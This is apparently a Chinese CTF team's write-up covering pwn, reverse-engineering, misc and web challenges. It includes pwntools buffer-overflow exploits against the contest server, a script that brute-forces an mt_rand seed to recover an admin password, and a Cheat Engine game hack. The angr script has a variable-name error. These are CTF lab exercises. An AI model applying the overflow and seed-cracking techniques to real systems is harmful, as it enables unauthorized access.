# return 0; wp

## pwn

### Password_checker

![](https://i.imgur.com/JwjIu9J.png)  

![](https://i.imgur.com/AO4VZzy.png)

```python
from pwn import *
from ctypes import *
import time

p=remote('ctf.asuri.org',20002)
p.sendline('a'*(260-4))
p.sendline('s'+p32(0x8048674)*8)
p.interactive()
```
然后在出来的文件系统中找到home/ctf/flag文件即可获得flag

### overflow

![](https://i.imgur.com/Td3r3LN.jpg)
下载文件之后  
直接拖进ida
然后找到main函数和旁边的sub_80485BD，溢出一下得到flag

```python
from pwn import *
from ctypes import *
import time

p=remote('ctf.asuri.org',20001)
libc = CDLL('libc.so.6')
t=libc.time(0)
print(hex(t))
libc.srand(t)
anser=libc.rand()
print(hex(anser))
p.sendline('a'*(0xFFC511CC-0xFFC511AC)+p32(anser)+'b'*(0xFFC511DC-0xFFC511CC-4)+p32(0x080485BD))

p.interactive()
```
## rev

### middle

```python
#!/usr/bin/env python
# coding=utf-8
import angr,string
import claripy
import pickle
import sys
import logging
import time
logging.getLogger('angr').setLevel('WARNING')

p = angr.Project('./middle.bin', load_options={'auto_load_libs': False})

# 804A0D8
# 804A0D0

def decode():  # 400D33
    symbols = [claripy.BVS('crypto%d' % i, 8) for i in range(24)]
    
    Content = claripy.Concat(*symbols)
    Stat0e = p.factory.blank_state(
        addr=0x000000080488EB ,
        stdin=Content,
        #add_options=angr.options.unicorn, #| {angr.options.ZERO_FILL_UNCONSTRAINED_MEMORY},
        remove_options={}
    )
    key = [claripy.BVS('key%d' % i, 8) for i in range(4)]
    state.memory.store(0x804A0D4,claripy.Concat(*key),4)
  
    for k in symbols:
        state.solver.add(k != 10)
        so1=state.solver.And( k > 8, k < 14)
        so2=state.solver.And( k > 31, k < 127)
        state.solver.add(state.solver.Or(so1,so2)==True)
    @p.hook(0x00000080489C3, length=5)
    def index(_state):
        print(_state, '233333')
    @p.hook(0x0000804882A, length=0)
    def index(_state):
        print(_state, '0x0000804882A')
    
    @p.hook(0x0008048831 , length=6)
    def index(_state):
        print(_state, 'pass')
        
        
    @p.hook(0x00804883E, length=0)
    def index(_state):
        print(_state, 'no pass')
    
    @p.hook(0x0008048863 , length=0)
    def index(_state):
        print(_state, '08048899')
      
    simulation = p.factory.simulation_manager(state)
    res = simulation.explore(find=0x0080488AF ,avoid=[0x080488BD ])  # , enable_veritesting=True
    print(len(res.found))
    result = []
    for pp in res.found:
        tmp = pp.solver.eval_upto(Content, 10,cast_to=bytes)
        print('yes',tmp)
        tmp = pp.solver.eval_upto(claripy.Concat(*key),10, cast_to=bytes)
        print('yes',tmp)
if __name__ == "__main__":
    decode()
```
## misc

### plot

用CAXA编程助手打开即得到flag
![](https://i.imgur.com/5NMqPxc.png)

### rev

```python
enc_flag = '86la1l52l9fl93l9dl97l52l9bla6l52l9fla1la4l97l52l96l9bl98l98l9bl95la7l9ela6l52la6la1l52l95l93l9el95la7l9el93la6l97l52la6l9al97l52l98l9el93l99l52l94labl52l9al93la0l96l5el52la0la7l93l93l95la6l98ladla2labl91la7la0l95la1l9fla2labl9el97lafl5el52l98l9el93l99l52l9bla5l52l98la1la4l52la5l95la4l9bla2la6la5l'
enc_flag=enc_flag.replace('l','')
b=bytes.fromhex(enc_flag)

print(b)
for k in b:
    print(chr(k-50),end='')
```



## Web

### 令人怀念的南邮综合题（确确实实是做出来了那种感觉）

![](http://thyrsi.com/t6/639/1545616214x2728278644.png)

先wascan扫一遍后台（抱歉咯）XD
发现存在一个www.zip的文件，下载以后打开发现是几个源码
然后就是痛苦的代码审计

![](http://thyrsi.com/t6/639/1545616764x2890174375.png)
在百度了两千年以后发现这边有点毛病，看上去管理员的密码是可控的，
然后就在网页里边随便注册了一个（其实是好几个）账号，
点击某个按钮以后跳转到某个网页，给了个int的值
![](http://thyrsi.com/t6/639/1545617009x2890174375.png)
（其实在此之前还跑了很多遍这个网页，操作成功的不是这个值）

```php
<?php
ini_set('max_execution_time', '0');
for($i=100000;$i++;$i<=1000000){
    mt_srand($i);
	if(mt_rand() == $_GET[1]){
        die(substr(md5(mt_rand()),0,6));
    }
}
?>

```
然后跑一下这串代码，得到admin（几来着）的密码，fefe还是tete什么的来着
最后登录admin拿到flag

## Re

### 车万狗的基本素养

#### 这道题真的不是misc吗？

————————————————————————————————————————————————

打开游戏，强打，失败（灵力真是少得可怜啊

然后开ce，老规矩，先吃几个p点，我这里是吃到1.12以后然后开始搜索的
ce搜索112，发现有个地址先前的值为100，那肯定就是灵力没跑了，修改值为400，然后锁定
![](http://thyrsi.com/t6/639/1545617335x2890174375.png)

后来发现满灵力是500，索性就改了（这真的是dld而不是fsl么

最后进游戏，一路炸炸炸，拿到flag

![](http://thyrsi.com/t6/639/1545617412x2890174375.png)


答应我，下次用luastg好吗